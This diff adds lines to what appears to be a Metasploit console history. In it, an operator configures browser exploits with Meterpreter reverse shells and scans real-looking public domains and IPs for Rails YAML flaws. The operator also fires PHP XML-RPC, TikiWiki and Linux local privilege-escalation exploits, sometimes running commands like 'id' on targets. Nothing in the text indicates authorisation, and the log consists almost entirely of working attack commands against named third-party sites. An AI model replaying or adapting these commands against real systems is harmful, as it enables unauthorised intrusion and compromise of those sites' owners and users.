@@ -178,3 +178,235 @@ quit
 exit -y
 search dope
 quit
+search dope
+quit
+db_nmap -A 10.0.0.0/24
+quit
+search slayout
+use exploit/windows/browser/slayout
+show payloads
+set payload windows/meterpreter/reverse_tcp_dns
+show options
+set lhost 10.1..0.10
+set lhost 10.1.0.10
+set srvhost 10.1.0.10
+set srvport 9001
+exploit
+show options
+set OBFUSCATE true
+exploit
+quit
+use exploit/windows/browser/slayout
+show options
+set OBFUSCATE true
+set srvport 9001
+set payload windows/meterpreter/reverse_tcp_dns
+set lhost 10.1.0.10
+exploit
+quit
+quit
+use exploits/multi/browser/java_jre17_jmxbean
+show options
+show payloads
+set payload java/meterpreter/reverse_http
+show options
+set lhost 10.1.0.10
+set srvport 8083
+exploit
+sessions -l
+sessions 1
+help
+sessions -h
+sessions -i 1
+quit
+exit -y
+search rails
+use auxiliary/scanner/http/rails_json_yaml_scanner
+show options
+set rhosts trust.boomi.com
+run
+set targeturi /users/password/new
+run
+show options
+set targeturi /admin
+run
+set targeturi /users/sign_in
+set rhost 12.206.240.43
+show options
+set rhosts 12.206.240.43
+run
+set http_method get
+run
+set http_method GET
+run
+help
+set targeturi /
+run
+info
+run
+set http_method POST
+run
+search rails
+use exploit/multi/http/rails_json_yaml_code_exec
+show options
+set rhost trust.boomi.com
+show payloads
+set payload ruby/shell_reverse_tcp_ssl
+show options
+show payloads
+set payload ruby/shell_bind_tcp
+show options
+set lport 8922
+exploit
+search rails
+use auxiliary/scanner/http/rails_xml_yaml_scanner
+info
+set rhosts trust.boomi.com
+set verbose true
+run
+set vhost trust.boomi.com
+run
+set rhosts cozmixng.org
+set vhost
+unset vhost
+show options
+set targeturi /~ rwiki
+set targeturi /~rwiki
+run
+set targeturi /
+run
+show options
+unset rhosts
+set rhosts remindem.instedd.org
+run
+set rhosts rstat.uus
+set rhosts rstat.us
+run
+unset rhosts
+set rhosts errbit.o5.no
+run
+set targeturi /users/sign_in
+show options
+set uripath /users/sign_in
+run
+set http_method get
+run
+set http_method GET
+run
+show options
+unset rhosts
+set rhosts selfstarter.us
+run
+unset uripath
+unset rhost
+show options
+set http_method POST
+run
+show options
+set uripath /
+unset rhosts
+set rhosts selfstarter.us
+run
+show options
+search pleask
+search plesk
+search drupal
+info exploit/unix/webapp/php_xmlrpc_eval
+use exploit/unix/webapp/php_xmlrpc_eval
+show options
+set rhost http://www.marcolinusa.com
+set path /products/xmlrpc.php
+show options
+show payloads
+set payload cmd/unix/generic
+show options
+set cmd id
+exploit
+show options
+exploit
+unset rhost
+set RHOST http://www.marcolinusa.com
+set RHOST www.marcolinusa.com
+show options
+exploit
+set rhost tamm-ha.com
+show options
+set path /xmlrpc.php
+exploit
+set rhost tamm-ha.com
+exploit
+set rhost belgradelakesgolf.com
+exploit
+show payloads
+search xmlrpc
+check
+set rhost nicolas-soret.fr
+check
+show options
+set rhost http://remysharp.com
+set rhost remysharp.com
+check
+set rhost experian.com
+set path /blogs/marketing-forward/xmlrpc.php
+check
+set path /xmlrpc.php
+search tiki
+use exploit/unix/webapp/tikiwiki_jhot_exec
+show payloads
+set payload cmd/unix/generic
+show options
+set cmd id
+set rhost northwestern.ourproject.org
+set uri /tiki
+check
+show options
+check
+set RHOST northwestern.ourproject.org
+check
+exploit
+set RHOST http://northwestern.ourproject.org
+check
+quit
+search tiki
+use exploit/unix/webapp/tikiwiki_jhot_exec
+show payloads
+use cmd/unix/generic
+set cmd id
+show options
+use  exploit/unix/webapp/tikiwiki_jhot_exec
+set payload cmd/unix/generic
+set cmd id
+set rhost www.mck66.com
+show options
+set uri /apeiron/tikiwiki/
+check
+exploit
+set cmd df -h
+exploit
+set cmd pwd
+exploit
+show payloads
+show options
+quit
+search local
+use exploit/linux/local/sock_sendpage
+show payloads
+set payload linux/x86/shell/bind_tcp
+show options
+set session 1
+set rhost dougsko.com
+exploit
+show options
+set session meterpreter
+exploit
+set session shell
+set SESSION shell
+exploit
+set SESSION meterpreter
+exploit
+use exploit/linux/local/udev_netlink 
+show options
+exploit
+set sesison 1
+exploit
+quit
